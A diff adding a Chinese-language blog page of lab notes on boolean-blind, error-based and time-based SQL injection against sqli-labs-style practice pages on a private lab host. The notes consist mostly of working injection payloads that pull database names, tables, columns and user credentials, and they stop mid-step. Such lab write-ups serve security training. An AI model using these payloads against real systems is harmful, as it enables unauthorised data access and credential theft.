@@ -1,0 +1,152 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta name="generator" content="Hexo 3.9.0"><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="简单的布尔盲注，报错注入，时间盲注"><meta name="keywords" content><meta name="author" content="John Doe"><meta name="copyright" content="John Doe"><title>简单的布尔盲注，报错注入，时间盲注 | Hexo</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.6.1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.6.1"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  }
+} </script></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar"><div class="toggle-sidebar-info text-center"><span data-toggle="Toggle article">Toggle site</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#2019-07-25实验笔记"><span class="toc-number">1.</span> <span class="toc-text">2019/07/25实验笔记</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">John Doe</div><div class="author-info__description text-center"></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">12</span></a></div></div></div><div id="content-outer"><div class="no-bg" id="top-container"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Hexo</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a></span><span class="pull-right"></span></div><div id="post-info"><div id="post-title">简单的布尔盲注，报错注入，时间盲注</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2019-08-17</time></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><h2 id="2019-07-25实验笔记"><a href="#2019-07-25实验笔记" class="headerlink" title="2019/07/25实验笔记"></a>2019/07/25实验笔记</h2><p>这里的盲注是通过判断之后再使用burpsuite进行狙击手模式的攻击，从而爆出库、表、字段、数据</p>
+<a id="more"></a>
+
+<p>对webp/boolean.php进行布尔盲注</p>
+<p>1、判断注入点</p>
+<p>2、判断数据库名的长度</p>
+<p>[<a href="http://172.16.13.21/webp/boolean.php?id=1%27%20and%20length(database())%3E=5%23]" target="_blank" rel="noopener">http://172.16.13.21/webp/boolean.php?id=1%27%20and%20length(database())%3E=5%23]</a>(<a href="http://172.16.13.21/webp/boolean.php?id=1&#39;" target="_blank" rel="noopener">http://172.16.13.21/webp/boolean.php?id=1&#39;</a> and length(database())&gt;=5%23)</p>
+<p><img src="http://ws1.sinaimg.cn/large/0078H38igy1g62t0npavaj30fe01tdgc.jpg" alt="img"> </p>
+<p>[<a href="http://172.16.13.21/webp/boolean.php?id=1%27%20and%20length(database())%3E=4%23]" target="_blank" rel="noopener">http://172.16.13.21/webp/boolean.php?id=1%27%20and%20length(database())%3E=4%23]</a>(<a href="http://172.16.13.21/webp/boolean.php?id=1&#39;" target="_blank" rel="noopener">http://172.16.13.21/webp/boolean.php?id=1&#39;</a> and length(database())&gt;=4%23)</p>
+<p><img src="http://ws3.sinaimg.cn/large/0078H38igy1g62t0t9o03j30fe020aaj.jpg" alt="img"> </p>
+<p>3、爆库得到库名</p>
+<p>[<a href="http://172.16.13.21/webp/boolean.php?id=1%27%20and%20substr(database(),1,1)=%27x%27%23]" target="_blank" rel="noopener">http://172.16.13.21/webp/boolean.php?id=1%27%20and%20substr(database(),1,1)=%27x%27%23]</a>(<a href="http://172.16.13.21/webp/boolean.php?id=1&#39;" target="_blank" rel="noopener">http://172.16.13.21/webp/boolean.php?id=1&#39;</a> and substr(database(),1,1)=’x’%23)</p>
+<p><img src="http://ws3.sinaimg.cn/large/0078H38igy1g62t0z5wm9j30da039mxq.jpg" alt="img"><img src="http://wx1.sinaimg.cn/large/0078H38igy1g62t18zuc6j301i02bt8k.jpg" alt="img"> </p>
+<p><img src="http://wx2.sinaimg.cn/large/0078H38igy1g62t1eugu2j307007x0ti.jpg" alt="img"><img src="http://wx4.sinaimg.cn/large/0078H38igy1g62t1klbycj302s019dfn.jpg" alt="img"> </p>
+<p><img src="http://wx3.sinaimg.cn/large/0078H38igy1g62t1q81h0j30fe0223yq.jpg" alt="img"> </p>
+<p>说明库的第一个字是t,同理得到库名为test</p>
+<p>4、爆表</p>
+<p>[<a href="http://172.16.13.21/webp/boolean.php?id=1%27%20and%20substr((select%20table_name%20from%20information_schema.tables%20where%20table_schema=%27test%27%20limit%200,1),1,1)=%27x%27%23]" target="_blank" rel="noopener">http://172.16.13.21/webp/boolean.php?id=1%27%20and%20substr((select%20table_name%20from%20information_schema.tables%20where%20table_schema=%27test%27%20limit%200,1),1,1)=%27x%27%23]</a>(<a href="http://172.16.13.21/webp/boolean.php?id=1&#39;" target="_blank" rel="noopener">http://172.16.13.21/webp/boolean.php?id=1&#39;</a> and substr((select table_name from information_schema.tables where table_schema=’test’ limit 0,1),1,1)=’x’%23)</p>
+<p>使用Burpsuite可得第一个表的第一个字为p</p>
+<p><img src="http://ws2.sinaimg.cn/large/0078H38igy1g62t2d3h7nj30fe00z74c.jpg" alt="img"> </p>
+<p>同理可得第一个表名为person</p>
+<p>5、爆字段</p>
+<p>[<a href="http://172.16.13.21/webp/boolean.php?id=1%27%20and%20substr((select%20column_name%20from%20information_schema.columns%20where%20table_schema=%27test%27%20%20and%20table_name=%27person%27%20limit%200,1),1,1)=%27x%27%23]" target="_blank" rel="noopener">http://172.16.13.21/webp/boolean.php?id=1%27%20and%20substr((select%20column_name%20from%20information_schema.columns%20where%20table_schema=%27test%27%20%20and%20table_name=%27person%27%20limit%200,1),1,1)=%27x%27%23]</a>(<a href="http://172.16.13.21/webp/boolean.php?id=1&#39;" target="_blank" rel="noopener">http://172.16.13.21/webp/boolean.php?id=1&#39;</a> and substr((select column_name from information_schema.columns where table_schema=’test’  and table_name=’person’ limit 0,1),1,1)=’x’%23)</p>
+<p>使用Burpsuite可得第一个表的第一个字段的第一个字为id</p>
+<p>同理得第一个表的第一个字段id</p>
+<p>同理得第一个表的第二个字段username</p>
+<p>同理得第一个表的第三个字段money</p>
+<p>6、爆数据</p>
+<p>[<a href="http://172.16.13.21/webp/boolean.php?id=1%27%20and%20substr((select%20username%20from%20test.person%20limit%200,1),1,1)=%27x%27%23]" target="_blank" rel="noopener">http://172.16.13.21/webp/boolean.php?id=1%27%20and%20substr((select%20username%20from%20test.person%20limit%200,1),1,1)=%27x%27%23]</a>(<a href="http://172.16.13.21/webp/boolean.php?id=1&#39;" target="_blank" rel="noopener">http://172.16.13.21/webp/boolean.php?id=1&#39;</a> and substr((select username from test.person limit 0,1),1,1)=’x’%23)</p>
+<p>使用Burpsuite可得第一个表的username字段的第一个字为w</p>
+<p>同理得第一个表的username字段的第一个数据为wangwu</p>
+<p>对sqli/less-8进行布尔注入</p>
+<p>1、判断注入点</p>
+<p>2、爆库</p>
+<p>[<a href="http://172.16.13.21/sqli/less-8/?id=1%27%20and%20substr(database(),1,1)=%27x%27%23]" target="_blank" rel="noopener">http://172.16.13.21/sqli/less-8/?id=1%27%20and%20substr(database(),1,1)=%27x%27%23]</a>(<a href="http://172.16.13.21/sqli/less-8/?id=1&#39;" target="_blank" rel="noopener">http://172.16.13.21/sqli/less-8/?id=1&#39;</a> and substr(database(),1,1)=’x’%23)</p>
+<p>使用burpsuite拦截，进行攻击</p>
+<p><img src="http://ws4.sinaimg.cn/large/0078H38igy1g62t2lfotpj30em01jdg0.jpg" alt="img"> </p>
+<p>得出数据库名的第一个字为：s</p>
+<p>依次可得出数据库名为security</p>
+<p>3、爆表</p>
+<p>[<a href="http://172.16.13.21/sqli/less-8/?id=1%27%20and%20substr((select%20table_name%20from%20information_schema.tables%20where%20table_schema=%27security%27%20limit%200,1),1,1)=%27%27%20--+]" target="_blank" rel="noopener">http://172.16.13.21/sqli/less-8/?id=1%27%20and%20substr((select%20table_name%20from%20information_schema.tables%20where%20table_schema=%27security%27%20limit%200,1),1,1)=%27%27%20--+]</a>(<a href="http://172.16.13.21/sqli/less-8/?id=1&#39;" target="_blank" rel="noopener">http://172.16.13.21/sqli/less-8/?id=1&#39;</a> and substr((select table_name from information_schema.tables where table_schema=’security’ limit 0,1),1,1)=’’ –+)</p>
+<p>得出数据库的第一个表名为：emails</p>
+<p>4、爆数据</p>
+<p><a href="http://172.16.13.21/sqli/less-8/?id=1&#39;" target="_blank" rel="noopener">http://172.16.13.21/sqli/less-8/?id=1&#39;</a> and substr((select column_name from information_schema.columns where table_schema=’security’ and table_name=’emails’ limit 0,1),1,1)=’x’ –+</p>
+<p>得出第一个字段为id</p>
+<p>得出第二个字段为email</p>
+<p>5、爆数据</p>
+<p><a href="http://172.16.13.21/sqli/less-8/?id=1&#39;" target="_blank" rel="noopener">http://172.16.13.21/sqli/less-8/?id=1&#39;</a> and substr((select id from security.emails limit 0,1),1,1)=’x’ –+</p>
+<p><img src="http://wx4.sinaimg.cn/large/0078H38igy1g62t2qjonqj30fe022wet.jpg" alt="img"> </p>
+<p>对webp/error.php进行报错注入攻击</p>
+<p>1、注入测试</p>
+<p>?username=a</p>
+<p>?username=a’</p>
+<p>?username=’ ‘  a  ‘   ‘    ‘</p>
+<p><img src="http://ws3.sinaimg.cn/large/0078H38igy1g62t3a2krtj30fe01ddge.jpg" alt="img"> </p>
+<p>2、爆库</p>
+<p>?username=a’ and updatexml(1,concat(0x7e,(database()),0x7e),1)–+</p>
+<p><img src="http://wx2.sinaimg.cn/large/0078H38igy1g62t3j35hnj30fe01jdg9.jpg" alt="img"> </p>
+<p>3、爆表</p>
+<p><img src="http://ws4.sinaimg.cn/large/0078H38igy1g62t3pj1zqj30fe029js3.jpg" alt="img"> </p>
+<p>4、爆字段</p>
+<p>?username=a’ and updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_schema=’test’ and table_name=’person’),0x7e),1)–+</p>
+<p><img src="http://wx4.sinaimg.cn/large/0078H38igy1g62t3v1uanj30fe018t92.jpg" alt="img"> </p>
+<p>5、爆数据</p>
+<p>?username=a’ and updatexml(1,concat(0x7e,(select group_concat(username,money) from test.person),0x7e),1)–+</p>
+<p><img src="http://ws3.sinaimg.cn/large/0078H38igy1g62t44cd8uj30fd019dg8.jpg" alt="img"> </p>
+<p>对sqli/less-5进行报错注入攻击</p>
+<p>1、测试</p>
+<p>2、爆库</p>
+<p>?id=a’ and updatexml(1,concat(0x7e,(database()),0x7e),1)–+</p>
+<p><img src="http://wx4.sinaimg.cn/large/0078H38igy1g62t4aewhmj30fe0463zf.jpg" alt="img"> </p>
+<p>3、爆表</p>
+<p>[<a href="http://172.16.13.21/sqli/less-5/?id=1%27%20and%20updatexml(1,concat(0x7e,(select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=%27security%27%20),0x7e),1)%23]" target="_blank" rel="noopener">http://172.16.13.21/sqli/less-5/?id=1%27%20and%20updatexml(1,concat(0x7e,(select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=%27security%27%20),0x7e),1)%23]</a>(<a href="http://172.16.13.21/sqli/less-5/?id=1&#39;" target="_blank" rel="noopener">http://172.16.13.21/sqli/less-5/?id=1&#39;</a> and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=’security’ ),0x7e),1)%23)</p>
+<p><img src="http://wx4.sinaimg.cn/large/0078H38igy1g62t4ilchvj30eo02saae.jpg" alt="img"> </p>
+<p>4、爆字段</p>
+<p>?id=a’ and updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_schema=’security’ and table_name=’users’),0x7e),1)–+</p>
+<p><img src="http://ws1.sinaimg.cn/large/0078H38igy1g62t4pj7s1j30eh01sweu.jpg" alt="img"> </p>
+<p>5、爆数据</p>
+<p>?id=a’ and updatexml(1,concat(0x7e,(select group_concat(username,password) from security.users),0x7e),1)–+</p>
+<p><img src="http://wx1.sinaimg.cn/large/0078H38igy1g62t4ua8nlj30eh0363yw.jpg" alt="img"> </p>
+<p>这里可以看到数据没有显现完</p>
+<p>这里使用limit来一条一条显示</p>
+<p>?id=a’ and updatexml(1,concat(0x7e,(select username from security.users limit 0,1),0x7e),1)–+</p>
+<p><img src="http://ws3.sinaimg.cn/large/0078H38igy1g62t4zgpvij30em01vdg5.jpg" alt="img"> </p>
+<p>对webp/time.php进行时间盲注</p>
+<p>1、检测是否存在Boolean注入</p>
+<p><a href="http://172.16.13.21/webp/time.php?id=1" target="_blank" rel="noopener">http://172.16.13.21/webp/time.php?id=1</a></p>
+<p><a href="http://172.16.13.21/webp/time.php?id=1" target="_blank" rel="noopener">http://172.16.13.21/webp/time.php?id=1</a> and 1=1</p>
+<p><a href="http://172.16.13.21/webp/time.php?id=1" target="_blank" rel="noopener">http://172.16.13.21/webp/time.php?id=1</a> and 1=2</p>
+<p>2、测试数据库名字长度</p>
+<p><a href="http://172.16.13.21/webp/time.php?id=1" target="_blank" rel="noopener">http://172.16.13.21/webp/time.php?id=1</a> and if(length(database())%3E=1,sleep(4),1)</p>
+<p><img src="http://ws2.sinaimg.cn/large/0078H38igy1g62t557rebj30fe033aav.jpg" alt="img"> </p>
+<p>可以看到这里在sleep，判断成功</p>
+<p>3、爆库</p>
+<p>1 and if(substr(database() ,1,1)=’x’,sleep(3),1)</p>
+<p>若正确则为world，错误则为hello world</p>
+<p><img src="http://wx4.sinaimg.cn/large/0078H38igy1g62t5bqzxhj30fd01sgm6.jpg" alt="img"> </p>
+<p>再次进行抓包</p>
+<p><img src="http://ws3.sinaimg.cn/large/0078H38igy1g62t5g4mhyj30fe02ct91.jpg" alt="img"> </p>
+<p>同理可得数据库名为test</p>
+<p>4、爆表</p>
+<p>1 and if(substr((select table_name from information_schema.tables where table_schema=’test’ limit 0,1),1,1)=’x’,sleep(3),1)</p>
+<p>抓包</p>
+<p>可得表的第一个字为p</p>
+<p><img src="http://wx4.sinaimg.cn/large/0078H38igy1g62t5mplxoj30fe00za9y.jpg" alt="img"> </p>
+<p><img src="http://wx1.sinaimg.cn/large/0078H38igy1g62t5ru5xsj30fe01g74f.jpg" alt="img"> </p>
+<p><img src="http://ws1.sinaimg.cn/large/0078H38igy1g62t5wzhbtj30fe017dft.jpg" alt="img"> </p>
+<p>最后可得表名为person</p>
+<p>5、爆字段</p>
+<p>1 and if(substr((select column_name from information_schema.columns where table_schema=’test’ and table_name=’person’ limit 0,1),1,1)=’x’,sleep(3),1)</p>
+<p>抓包</p>
+<p><img src="http://ws4.sinaimg.cn/large/0078H38igy1g62t627z4nj30fe01bq2x.jpg" alt="img"> </p>
+<p><img src="http://ws2.sinaimg.cn/large/0078H38igy1g62t6b1y8fj30fe01gdfv.jpg" alt="img"> </p>
+<p>可得第一个字段为id</p>
+<p>6、爆数据</p>
+<p>1 and if(substr((select id from test.person limit </p>
+<p>0,1),1,1)=’x’,sleep(3),1)</p>
+<p>抓包</p>
+<p><img src="http://wx1.sinaimg.cn/large/0078H38igy1g62t6gl2aij30fd0160sp.jpg" alt="img"> </p>
+<p><img src="http://ws4.sinaimg.cn/large/0078H38igy1g62t6lg7uuj30fe01yjrk.jpg" alt="img"> </p>
+<p>可以得到数据id=1</p>
+<p>对sqli/less-9进行时间布尔盲注</p>
+<p>1、测试是否有布尔注入</p>
+<p>1</p>
+<p>1’</p>
+<p>1’ and sleep(3)–+</p>
+<p>-1’ and sleep(3)–+</p>
+<p>2、爆库</p>
+<p>id=1’ and if(substr(database(),1,1)=’x’,sleep(3),1)–+ </p>
+<p><img src="http://ws3.sinaimg.cn/large/0078H38igy1g62t6z2tbmj30fe01imx5.jpg" alt="img"> </p>
+<p>依次可以得出库名security</p>
+<p>3、爆表</p>
+<p>id=1’and if (substr((select table_name from information_schema.tables where table_schema=’security’ limit 1,1),1,1)=’x’,sleep(3),1) –+</p>
+<p><img src="http://ws4.sinaimg.cn/large/0078H38igy1g62t73ml40j30fe0100sm.jpg" alt="img"> </p>
+<p><img src="http://wx1.sinaimg.cn/large/0078H38igy1g62t78fbnmj30fe01dq2y.jpg" alt="img"> </p>
+<p>依次可得表名为referers</p>
+<p>4、爆字段</p>
+<p>id=1’and if (substr((select column_name from information_schema.columns where table_schema=’security’and table_name=’referers’ limit 0,1),1,1)=’x’,sleep(3),1) –+</p>
+</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">John Doe</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://yoursite.com/2019/08/17/布尔盲注报错注入时间盲注/">http://yoursite.com/2019/08/17/布尔盲注报错注入时间盲注/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="post-meta__tag-list"></div><nav id="pagination"><div class="prev-post pull-left"><a href="/2019/08/17/堆叠，二次，宽字符，cookie注入/"><i class="fa fa-chevron-left">  </i><span>简单的堆叠、二次、宽字符、cookie注入</span></a></div><div class="next-post pull-right"><a href="/2019/08/17/数据库远程连接的操作和简单的sql注入/"><span>设置数据库远程连接和简单的sql注入</span><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer><div class="layout" id="footer"><div class="copyright">&copy;2013 - 2019 By John Doe</div><div class="framework-info"><span>Driven - </span><a href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.6.1"></script><script src="/js/fancybox.js?version=1.6.1"></script><script src="/js/sidebar.js?version=1.6.1"></script><script src="/js/copy.js?version=1.6.1"></script><script src="/js/fireworks.js?version=1.6.1"></script><script src="/js/transition.js?version=1.6.1"></script><script src="/js/scroll.js?version=1.6.1"></script><script src="/js/head.js?version=1.6.1"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
+  $('#nav').addClass('is-mobile')
+  $('footer').addClass('is-mobile')
+  $('#top-container').addClass('is-mobile')
+}</script></body></html>
